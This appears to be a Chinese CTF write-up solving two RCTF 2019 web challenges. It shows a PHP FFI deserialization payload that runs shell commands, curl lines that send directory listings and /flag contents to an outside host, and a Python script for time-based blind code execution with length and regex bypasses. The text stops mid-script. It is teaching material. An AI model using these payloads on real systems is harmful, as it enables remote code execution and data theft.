    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本坑开的好久了= =，但一直太忙了，现在已经是7月了，都想不起来还有啥题了，只把坑先填上了~</p><h2 id="nextphp"><a href="#nextphp" class="headerlink" title="nextphp"></a>nextphp</h2><p>拿到题目<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])) &#123;</span><br><span class="line">        <span class="keyword">eval</span>($_GET[<span class="string">'a'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>列目录查看一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://nextphp.2019.rctf.rois.io/?a=var_dump(scandir(%27.%27));</span><br></pre></td></tr></table></figure></p><p>得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(4) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(9) &quot;index.php&quot; [3]=&gt; string(11) &quot;preload.php&quot; &#125;</span><br></pre></td></tr></table></figure></p><p>发现存在preload.php页面，尝试读源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'print_r'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'1'</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span><span class="params">()</span>: <span class="title">array</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span><span class="params">(array $data)</span> </span>&#123;</span><br><span class="line">        array_merge(<span class="keyword">$this</span>-&gt;data, $data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> <span class="params">($key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span> <span class="params">($key, $value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>尝试查看限制，读取phpinfo()，发现open_basedir限制：<br><img src="/images/2019-05-18-20-47-09.png" alt=""><br>发现disable_functions限制：<br><img src="/images/2019-05-18-20-47-22.png" alt=""><br>基本可以确定，又是一个bypass open_basedir和disable_functions的题目。<br>有了之前0ctf和*ctf的参考，我可以基本确定，这道题应该有某些拓展或者文件可以利用，否则很难达到目标，那么preload就是一个突破口，可以得知:<br><img src="/images/2019-05-21-13-35-19.png" alt=""><br>同时发现题目是php7.4，开启FFI扩展：<br><img src="/images/2019-05-18-20-40-09.png" alt=""><br>FFI（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术。<br>FFI的使用非常简单，只用声明和调用两步就可以，对于有C语言经验，但是不了解Zend引擎的程序员来说，这简直是打开了新世界的大门，可以快速地使用C类库进行原型试验。<br>php样例如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// create FFI object, loading libc and exporting function printf()</span></span><br><span class="line">$ffi = FFI::cdef(</span><br><span class="line">    <span class="string">"int printf(const char *format, ...);"</span>, <span class="comment">// this is a regular C declaration</span></span><br><span class="line">    <span class="string">"libc.so.6"</span>);</span><br><span class="line"><span class="comment">// call C's printf()</span></span><br><span class="line">$ffi-&gt;printf(<span class="string">"Hello %s!\n"</span>, <span class="string">"world"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>可以发现FFI，可以直接调用底层c的函数执行命令，我们搜索一下：<br>printf对应的申明：<br><img src="/images/2019-05-18-21-30-01.png" alt=""><br>那么搜索system对应的申明:<br><img src="/images/2019-05-18-21-29-41.png" alt=""><br>将官方样例改写：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ffi = FFI::cdef(<span class="string">"int system (const char* command);"</span>);</span><br><span class="line">$ffi-&gt;system(<span class="string">"ls"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>利用序列化触发，构造序列化为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">➜ cat 1.php</span><br><span class="line">&lt;?php</span><br><span class="line">final class A implements Serializable &#123;</span><br><span class="line">    protected $data = [</span><br><span class="line">        &apos;ret&apos; =&gt; null,</span><br><span class="line">        &apos;func&apos; =&gt; &apos;FFI::cdef&apos;,</span><br><span class="line">        &apos;arg&apos; =&gt; &quot;int system (const char* command);&quot;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    public function serialize (): string &#123;</span><br><span class="line">        return serialize($this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function unserialize($payload) &#123;</span><br><span class="line">        $this-&gt;data = unserialize($payload);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new A;</span><br><span class="line">echo serialize($a);</span><br><span class="line">➜ php7.4 1.php</span><br><span class="line">C:1:&quot;A&quot;:96:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:33:&quot;int system (const char* command);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure></p><p>得到序列化:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:1:&quot;A&quot;:96:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:33:&quot;int system (const char* command);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure></p><p>尝试执行命令:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://nextphp.2019.rctf.rois.io/?a=$a=unserialize(&apos;C:1:&quot;A&quot;:96:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:33:&quot;int system (const char* command);&quot;;&#125;&#125;&apos;);var_dump($a-&gt;ret-&gt;system(&apos;ls&apos;));</span><br></pre></td></tr></table></figure></p><p>直接执行命令只返回<code>int(1792)</code>等，于是考虑用盲打，为了防止特殊字符，我们使用了Base64：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://nextphp.2019.rctf.rois.io/?a=$a=unserialize(&apos;C:1:&quot;A&quot;:96:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:33:&quot;int system (const char* command);&quot;;&#125;&#125;&apos;);var_dump($a-&gt;ret-&gt;system(&apos;curl ip:23333/`ls / | base64`&apos;));</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-05-18-21-21-15.png" alt=""><br><img src="/images/2019-05-18-21-29-00.png" alt=""><br>可以成功列目录，找到flag，继续读文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://nextphp.2019.rctf.rois.io/?a=$a=unserialize(&apos;C:1:&quot;A&quot;:96:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:33:&quot;int system (const char* command);&quot;;&#125;&#125;&apos;);var_dump($a-&gt;ret-&gt;system(&apos;curl ip:23333/`cat /flag | base64`&apos;));</span><br></pre></td></tr></table></figure></p><p>得到：<br><img src="/images/2019-05-18-21-21-59.png" alt=""><br><img src="/images/2019-05-18-21-23-46.png" alt=""></p><h2 id="calcalcalc"><a href="#calcalcalc" class="headerlink" title="calcalcalc"></a>calcalcalc</h2><h3 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h3><p>这是一道很有趣的题，题目使用了拟态的构想，使用了三种后端：nodejs、php、python<br>原理很清晰，我们input的参数，会分别进入3种后端进行执行，如果3种后端最后的返回值不同，那么则认定为无效，会做一些处理。如果返回值一致，认定为安全，则将执行结果返回。<br>我们简单测试一下：<br><img src="/images/2019-05-21-13-48-52.png" alt=""><br>当执行结果不同时，返回禁止事项：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">That&apos;s classified information. - Asahina Mikuru</span><br></pre></td></tr></table></figure></p><p>如果结果一致时：<br><img src="/images/2019-05-21-13-49-23.png" alt=""><br>则正常返回结果。</p><h3 id="后端分析"><a href="#后端分析" class="headerlink" title="后端分析"></a>后端分析</h3><p>题目给出了环境代码，我们简单看一下：<br>首先是python代码：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> bson</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> __builtins__[<span class="string">'exec'</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/", methods=["POST"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calculate</span><span class="params">()</span>:</span></span><br><span class="line">    data = request.get_data()</span><br><span class="line">    expr = bson.BSON(data).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bson.BSON.encode(&#123;</span><br><span class="line">      <span class="string">"ret"</span>: str(eval(str(expr[<span class="string">'expression'</span>])))</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure></p><p>其中做出了一些限制，例如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del __builtins__[&apos;exec&apos;]</span><br></pre></td></tr></table></figure></p><p>但其确实直接会eval参数<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> bson.BSON.encode(&#123;</span><br><span class="line">      <span class="string">"ret"</span>: str(eval(str(expr[<span class="string">'expression'</span>])))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>除此之外还设置了timeout:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timeout = 1</span><br></pre></td></tr></table></figure></p><p>然后是php代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ob_start();</span><br><span class="line">$input = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$options = MongoDB\BSON\toPHP($input);</span><br><span class="line">$ret = <span class="keyword">eval</span>(<span class="string">'return '</span> . (string) $options-&gt;expression . <span class="string">';'</span>);</span><br><span class="line"><span class="keyword">echo</span> MongoDB\BSON\fromPHP([<span class="string">'ret'</span> =&gt; (string) $ret]);</span><br></pre></td></tr></table></figure></p><p>我们发现其也会直接执行命令:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ret = <span class="keyword">eval</span>(<span class="string">'return '</span> . (string) $options-&gt;expression . <span class="string">';'</span>);</span><br><span class="line"><span class="keyword">echo</span> MongoDB\BSON\fromPHP([<span class="string">'ret'</span> =&gt; (string) $ret]);</span><br></pre></td></tr></table></figure></p><p>同时也设置了相关设置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">disable_functions = set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log</span><br><span class="line">max_execution_time = 1</span><br></pre></td></tr></table></figure></p><p>最后是nodejs：<br>同样做出了时间限制和一些过滤：<br><img src="/images/2019-05-21-13-54-24.png" alt=""><br><img src="/images/2019-05-21-13-54-43.png" alt=""><br>并且也会直接执行参数：<br><img src="/images/2019-05-21-13-55-02.png" alt=""><br>简单对这3种后端做一个总结，都过滤了个别危险函数/库，都做了超时设定。都会直接eval输入的参数。</p><h3 id="攻击思考"><a href="#攻击思考" class="headerlink" title="攻击思考"></a>攻击思考</h3><p>看完后端，我的第一反应：每一个后端都是直接进行eval，并没有预执行，或者放在sandbox中执行，那如果我们的恶意参数输入，确实是先执行后，才比对结果，那么最多只会看不到回显而已，按照规则，只能得到:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">That&apos;s classified information. - Asahina Mikuru</span><br></pre></td></tr></table></figure></p><p>但我们的恶意代码确实已经执行了。顺着这一点，我尝试考虑数据外带，例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl ip:23333/`ls | base64`</span><br></pre></td></tr></table></figure></p><p>但是很遗憾：<br>从docker-compose.yml中可以看到，3台后端都在内网中，ip分别为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nodejs 10.0.20.11</span><br><span class="line">python 10.0.20.11</span><br><span class="line">php 10.0.20.11</span><br></pre></td></tr></table></figure></p><p>我们并不能外带数据。那么有没有什么其他方式可以获取命令执行的数据呢？<br>这里可以参考我之前写过的一篇文章：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://skysec.top/2017/12/29/Time-Based-RCE/</span><br></pre></td></tr></table></figure></p><p>这篇文章介绍了2种外带数据的方法，第一种就是前面所说，利用curl / ping的方式，而第二种，则是本次用到的方式，即Time Based Rce。<br>想必大家都对sql盲注耳熟能详，其中有一种类型的注入叫做基于时间的sql注入，其原理是因为无论攻击者如何测试，网页回显永远保持一致，而攻击者只能通过时间来判断自己的结果是否成功。<br>对于这里的情况正好符合需求，因为我们无法得到命令执行回显，但可以得到网页执行的时间。<br>简单思考一下，前端做出的响应，一定是在3种后端都执行完毕后才进行响应。那么整个响应时间就会由3种后端，响应速度最慢的一个决定。那么我们是否可以只关注其中一个后端，让他的响应时间变为立即响应 / 延时5s响应，那么整个前端的时间就会变成立即响应 / 延时5s响应，那么我们就能通过前端的响应时间，来判断其中某个后端的执行结果是否成功。<br>但是这里我们遇到问题，不难发现，出题人在3个后端中都设置了超时1s的操作。<br>但是测试的时候，我惊奇的发现：<br><img src="/images/2019-05-21-14-10-58.png" alt=""><br>我可以通过sleep函数成功控制响应时间。随机我马上测试了一下，判断这是哪个后端产生的问题：<br>对于nodejs：<br><img src="/images/2019-05-21-14-12-03.png" alt=""><br>我们发现nodejs并没有sleep这种函数，那么问题一定是在python或者php上。<br>为了测试python,我构造了一个死循环：<br><img src="/images/2019-05-21-14-13-35.png" alt=""><br>我尝试将这个List不断扩大：list(range(10000000))，用以加大整个后端的执行时间，但是此时抛出了另一种回显：<br><img src="/images/2019-05-21-14-14-51.png" alt=""><br>随机我去查看代码，发现了还有另外的检验：<br><img src="/images/2019-05-21-14-48-08.png" alt=""><br><img src="/images/2019-05-21-14-49-05.png" alt=""><br>这里对长度做了校验，要求小于15.同时有正则需要进行bypass。<br>我们简单测试：<br>14个1时：<br><img src="/images/2019-05-21-14-49-54.png" alt=""><br>15个1时：<br><img src="/images/2019-05-21-14-50-02.png" alt=""><br>这里的长度限制极大阻碍了我们进行bypass，同时从正则来看，我们所拥有的只有字母、数字、加减乘除，这对我们进行命令执行，数据盲注产生了极大的阻碍。</p><h3 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h3><p>那么为了成功的进行数据外带，我们开始思考如何bypass长度限制，因为字符正则并不是非常严格，我们可以想办法进行bypass：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!(args.object <span class="keyword">as</span> CalculateModel).isVip) &#123;</span><br><span class="line"><span class="keyword">if</span> (str.length &gt;= args.constraints[<span class="number">0</span>]) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们看到，只要<code>(args.object as CalculateModel).isVip</code>为true，即可不进入if操作。<br>我们跟进，发现isVip的值默认为false:<br><img src="/images/2019-05-21-15-13-10.png" alt=""><br>故此我们可以构造json数组如下：<br><img src="/images/2019-05-22-21-11-53.png" alt=""><br>可以看到400的Response已经回显正常，变为禁止事项。（至于为什么没有正常回显，是因为数字较大，三种执行体的结果不一致）<br>那么既然可以正常bypass长度限制了，那么我们可以进行正则bypass。想到正则中有加号，而加号在python里可以用于字符串拼接，那么不难想到chr()的拼接方式。我们首先测试exp:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ord(open(&quot;/flag&quot;).read()[0])==1) and set(1 for i in range(1000000000))</span><br></pre></td></tr></table></figure></p><p>如下测试我们发现：<br><img src="/images/2019-05-22-21-39-31.png" alt=""><br>当读取flag数据值不匹配时，不会进行set(1 for i in range(1000000000))，而当匹配后会正常执行。（但这里由于写的太大，所以并没有进行延时，而是直接报内存错误）<br>那么我们将range缩小一些：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ord(open(&quot;/flag&quot;).read()[0])==1) and set(1 for i in range(10000000))</span><br></pre></td></tr></table></figure></p><p>再利用脚本将其转chr()：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="string">'''(open("/flag").read()[0]=='a') and set(1 for i in range(10000000))'''</span></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">res+=<span class="string">'chr(%s)+'</span>%ord(i)</span><br><span class="line"><span class="keyword">print</span> res[:<span class="number">-1</span>]</span><br></pre></td></tr></table></figure></p><p>得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chr(40)+chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+chr(34)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(34)+chr(41)+chr(46)+chr(114)+chr(101)+chr(97)+chr(100)+chr(40)+chr(41)+chr(91)+chr(48)+chr(93)+chr(61)+chr(61)+chr(39)+chr(97)+chr(39)+chr(41)+chr(32)+chr(97)+chr(110)+chr(100)+chr(32)+chr(115)+chr(101)+chr(116)+chr(40)+chr(49)+chr(32)+chr(102)+chr(111)+chr(114)+chr(32)+chr(105)+chr(32)+chr(105)+chr(110)+chr(32)+chr(114)+chr(97)+chr(110)+chr(103)+chr(101)+chr(40)+chr(49)+chr(48)+chr(48)+chr(48)+chr(48)+chr(48)+chr(48)+chr(48)+chr(41)+chr(41)</span><br></pre></td></tr></table></figure></p><p>测试一下，在匹配失败时：<br><img src="/images/2019-05-22-21-50-20.png" alt=""><br>在成功时：<br><img src="/images/2019-05-22-21-49-16.png" alt=""><br>可以发现时间大致一致，那么这是为什么呢？按照正常情况下来说:<br><img src="/images/2019-05-23-19-25-16.png" alt=""><br>应该在条件满足情况下会延时1s，而条件成立时应该立刻反馈，时间小于1s。那么应该可以通过1s这个分界点，判断是否执行成功。那么为什么现在的时长这么大，并且非常接近呢？<br>这里想到应该是在后端nodejs crash导致的不稳定性，由于裁决器需要交互，而nodejs一直处于crash的状态，迟迟不进行response，导致整个页面加载时间很长。所以这里不难想到需要阻止node js的语法错误。<br>那么自然可以想到使用注释符，但是如何保证python也运行正常呢？<br>观察正则的符号，仅有<code>//</code>可用于注释，而<code>//</code>又刚好是python的除法，那么我们可以构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1//1 and (ord(open(&quot;/flag&quot;).read()[0])==1) and set(1 for i in range(10000000))</span><br></pre></td></tr></table></figure></p><p>这样在php和nodejs中，只会剩下1，而在python中剩下的却是整个exp。这样一来我们可以避免nodejs或者php的crash等时延因素，单纯靠python进行时间延迟注入，带出数据。所以Bypass exp可以为:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">transfer</span><span class="params">(s)</span>:</span></span><br><span class="line">    ss = <span class="string">"+"</span>.join([<span class="string">"chr(&#123;&#125;)"</span>.format(ord(i)) <span class="keyword">for</span> i <span class="keyword">in</span> s])</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"eval(&#123;&#125;)"</span>.format(ss)</span><br><span class="line"></span><br><span class="line">cat_flag = transfer(<span class="string">'open("/flag").read()'</span>)</span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://calcalcalc.2019.rctf.rois.io/calculate"</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">  <span class="string">'Content-Type'</span>: <span class="string">"application/json"</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">base = <span class="string">"1//1 and not (ord(&#123;&#125;[&#123;&#125;]) - &#123;&#125;) and set(1 for i in range(1000000000))"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(exp, cnt=<span class="number">0</span>)</span>:</span></span><br><span class="line">    payload = <span class="string">"&#123;\n\t\"expression\": \""</span> + exp + <span class="string">"\",\n\t\"isVip\": true\n&#125;"</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url, data=payload, headers=headers, timeout=<span class="number">0.5</span>)</span><br><span class="line">        print(response.text)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">if</span> cnt &lt; <span class="number">5</span>:</span><br><span class="line">            time.sleep(<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">return</span> test(exp, cnt+<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">"RCTF&#123;watch_Kemurikusa_to_c4lm_d0wn&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag), <span class="number">36</span>):</span><br><span class="line">    <span 